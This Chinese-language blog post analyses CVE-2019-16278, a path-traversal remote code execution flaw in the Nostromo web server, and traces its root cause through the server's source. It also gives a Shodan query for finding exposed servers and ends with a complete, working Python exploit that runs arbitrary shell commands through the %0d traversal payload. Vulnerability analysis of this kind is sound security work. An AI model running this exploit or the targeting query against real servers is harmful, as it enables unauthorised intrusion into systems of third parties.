# CVE-2019-16278-Nostromo Web Server远程代码执行 - 17bdw - 博客园

> 原文：[https://www.cnblogs.com/17bdw/p/12057671.html](https://www.cnblogs.com/17bdw/p/12057671.html)

本文主题主要是分析[CVE-2019-16278](https://nvd.nist.gov/vuln/detail/CVE-2019-16278)漏洞原因、漏洞如何利用以及为什么会受到攻击。这个CVE跟[Nostromo Web服务器](http://www.nazgul.ch/dev_nostromo.html)（又名nhttpd）有关，这个组件是在FreeBSD，OpenBSD等Unix系统上非常流行的开源Web服务器。

Nostromo无法验证URL，导致可以通过[路径遍历](https://www.owasp.org/index.php/Path_Traversal)系统中的任何文件。没有通过身份验证的攻击者可以强制服务器指向`/bin/sh`之类的shell文件并执行任意命令。由于所有Nostromo的版本（包括最新版本1.9.6）都很容易受到攻击，甚至其开发人员的网站www.nazgul.ch也可以利用。

Nostromo之前也有路径遍历漏洞，未授权远程代码执行[CVE-2011-0751](https://nvd.nist.gov/vuln/detail/CVE-2011-0751)。在URI解码的转义字符之前，Web服务器会先检查URI中的字符串/../，然后[RedTeam Pentesting GmbH](https://www.redteam-pentesting.de/en/advisories/rt-sa-2011-001/-nostromo-nhttpd-directory-traversal-leading-to-arbitrary-command-execution)发现了这个漏洞。将字符**/**编码为**％2f**并将其传递给服务器，如下所示：
**/..%2f..%2f..%2fbin/sh**

虽然Nostromo在检查字符串/../之前解码转义字符来修复1.9.4版中的CVE-2011-0751，但是仍然被[sp0re](https://sp0re.sh/)绕过，并且CVE-2019-16278可以返回Nostromo路径遍历的结果。

## 在野利用:

在[Shodan](https://www.shodan.io/search?query=%22Server%3A+nostromo%22)上使用以下查询语句可以找到大约2000个暴露于互联网上的Nostromo Web服务器：

"Server: nostromo"

![](../Images/ef42fd0bd7bfb6975df8abdaeb67fb0e.png)

可以使用Python编写的[PoC](https://github.com/sudohyak/exploit/blob/master/CVE-2019-16278/exploit.py)对一些服务器验证漏洞，实际上这些所有服务器都可以被攻击。

![](../Images/7a94c59d4e09653dff69879505603a23.png)

EXP发送了一个HTTP请求，URI中带有/.%0d./.%0d./.%0d./.%0d./bin/sh。 跟CVE-2011-0751对比，只是将`％2f`更改为Nostromo没有检查到的字符`％0d`。

那么系统为什么可以用含有`％0d ./.% 0d./`而不是`../../`这样的回车符（CR）去遍历上层目录。 其实系统接收到没有任何CR字符的../../。 那么，那些CR字符哪里去了？

这些疑问可以通过分析Nostromo源码得到答案，Nostromo 1.9.6版本源代码([http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz](http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz))。

## 源码分析：

当接收到URI，先进行验证然后进行处理。

![](../Images/999a9ee16f5d569d37174724dc11c159.png)

在http_verify()函数里，这个URI先是被http_decode_header_uri()函数解码，然后检查`/../.`是否存在。这个URI现在是`/.\r./.\r./.\r./.\r./bin/sh`.

![](../Images/01f9c7bc4282f4cafb89af682c77370f.png)

接下来，在http_proc()函数中，将URI传给http_header()函数

![](../Images/ae4c1561eab39ae6f0b821a172429ea9.png)

根本原因在这里，在http_header()函数中，通过strcutl()函数解析URI。

![](../Images/645accd607241f507c51648834d68ca6.png)

看一下strcutl()函数的实现，可以看到是接收一个字符串并以`\ r`（回车）被截断了返回。

![](../Images/3019c6c664fbf62dfd919d96c7bb84e1.png)

现在路径是`/../../../../bin/sh`。 那么路径遍历部分完成了之后又怎么被执行呢？是因为http_proc()函数中的execve()函数。 执行rh-> rq_filef时，实际值是路径`/../../../../bin/sh`。

![](../Images/d3fe87bd4e1547c94c1b29e1d866768e.png)

这个漏洞就是这么通过路径遍历实现RCE的！

## POC代码

```
#!/usr/bin/env python

import socket
import argparse

parser = argparse.ArgumentParser(description='RCE in Nostromo web server through 1.9.6 due to path traversal.')
parser.add_argument('host',help='domain/IP of the Nostromo web server')
parser.add_argument('port',help='port number',type=int)
parser.add_argument('cmd',help='command to execute, default is id',default='id',nargs='?')
args = parser.parse_args()

def recv(s):
	r=''
	try:
		while True:
			t=s.recv(1024)
			if len(t)==0:
				break
			r+=t
	except:
		pass
	return r
def exploit(host,port,cmd):
	s=socket.socket()
	s.settimeout(1)
	s.connect((host,int(port)))
	payload="""POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1""".format(cmd)
	s.send(payload)
	r=recv(s)
	r=r[r.index('\r\n\r\n')+4:]
	print r

exploit(args.host,args.port,args.cmd) 
```

## 参考

[https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html](https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html)